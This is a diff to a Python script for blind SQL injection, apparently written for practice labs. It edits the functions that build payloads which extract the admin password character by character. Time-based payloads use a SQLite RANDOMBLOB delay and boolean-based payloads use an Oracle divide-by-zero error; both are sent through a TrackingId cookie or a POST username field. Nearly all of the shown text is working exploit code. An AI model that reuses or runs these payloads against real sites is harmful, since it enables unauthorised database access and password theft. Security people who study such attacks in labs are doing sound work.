@@ -3,8 +3,8 @@ import time
 
 
 
-def bad_sql_query(indice: str=None, parameter: str=None):
-    bad_sql = f"'and (select case when((select+substr(password,{indice},1)+from+users+where+username='admin')>'{parameter}') then 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) else null end)--"
+def bad_sql_query_time(indice: str=None, parameter: str=None):
+    bad_sql = f"' and (select case when ((select substr(password,{indice},1) from users where username='admin'){parameter}) then 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) else null end)--"
     return bad_sql
 
 """
@@ -34,11 +34,11 @@ def bad_sql_query(indice: str=None, parameter: str=None):
 """
 
 
-def sending_payload_for_time_based_SQLi(payload_parameter1 : str, payload_parameter2: str,url: str, indice: int) -> bool:
+def sending_payload_for_time_based_SQLi_getv(payload_parameter1 : str, payload_parameter2: str,url: str, indice: int) -> bool:
     
     #The payload is in the bad_sql_query function
     
-    bad_sql1 = bad_sql_query(indice, payload_parameter1)
+    bad_sql1 = bad_sql_query_time(indice, payload_parameter1)
     
     #SET THE COOKIES HERE WITH NAME AND VALUE IF NOT... JUST MAKE IT EMPTY !!!
     cookies = {
@@ -63,7 +63,7 @@ def sending_payload_for_time_based_SQLi(payload_parameter1 : str, payload_parame
         print("")    
     
         
-    bad_sql2 = bad_sql_query(indice, payload_parameter2)
+    bad_sql2 = bad_sql_query_time(indice, payload_parameter2)
     cookies = {
             'TrackingId': f"xxx	{bad_sql2}",
             'session': 'XXX'
@@ -92,10 +92,10 @@ def sending_payload_for_time_based_SQLi_postv(payload_parameter1 : str, payload_
     
     #The payload is in the bad_sql_query function
     
-    bad_sql1 = bad_sql_query(indice, payload_parameter1)
+    bad_sql1 = bad_sql_query_time(indice, payload_parameter1)
     
     #here put the data value, if is empty just do that : data=...
-    data=f"username=admin{bad_sql1}&password=bar"
+    data=f"username=admin{bad_sql1}&password=foo"
     
     """Where the magic happens, we start the clock to know how much time the server answer to us"""
     
@@ -105,7 +105,7 @@ def sending_payload_for_time_based_SQLi_postv(payload_parameter1 : str, payload_
     
     """Here we will know if the SQL_query will work, with a simple boolean operation"""
 
-    result_bool = (end_time - start_time) >= 5
+    result_bool = (end_time - start_time) >= 4
     
     
     if result_bool:
@@ -114,7 +114,7 @@ def sending_payload_for_time_based_SQLi_postv(payload_parameter1 : str, payload_
         print("")    
     
         
-    bad_sql2 = bad_sql_query(indice, payload_parameter2)
+    bad_sql2 = bad_sql_query_time(indice, payload_parameter2)
     data=f"username=admin{bad_sql2}&password=bar"
     
     start_time = time.time()
@@ -122,7 +122,7 @@ def sending_payload_for_time_based_SQLi_postv(payload_parameter1 : str, payload_
     end_time = time.time()
     
     
-    result_control = (end_time - start_time) >= 5
+    result_control = (end_time - start_time) >= 4
     
     
     if result_control:
@@ -140,7 +140,7 @@ def sending_payload_for_time_based_SQLi_postv(payload_parameter1 : str, payload_
 
 
 
-def bad_sql_query(indice: str=None, parameter: str=None):
+def bad_sql_query_boolean(indice: str=None, parameter: str=None):
     bad_sql = f"'||(SELECT CASE WHEN SUBSTR(password,{indice},1){parameter} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
     return bad_sql
 
@@ -169,7 +169,7 @@ def sending_payload_for_boolean_based_SQLi(payload_parameter1 : str, payload_par
     
     #The payload is in the bad_sql_query function
     
-    bad_sql1 = bad_sql_query(indice, payload_parameter1)
+    bad_sql1 = bad_sql_query_boolean(indice, payload_parameter1)
     
     #SET THE COOKIES HERE WITH NAME AND VALUE IF NOT... JUST MAKE IT EMPTY !!!
     cookies = {
@@ -189,7 +189,7 @@ def sending_payload_for_boolean_based_SQLi(payload_parameter1 : str, payload_par
         print("")    
     
         
-    bad_sql2 = bad_sql_query(indice, payload_parameter2)
+    bad_sql2 = bad_sql_query_boolean(indice, payload_parameter2)
     cookies = {
             'TrackingId': f"XVmK2up50yoi6anT{bad_sql2}",
             'session': 'snNXaKrRa0DHU2GhnSekRYOLJgQYWFzA'
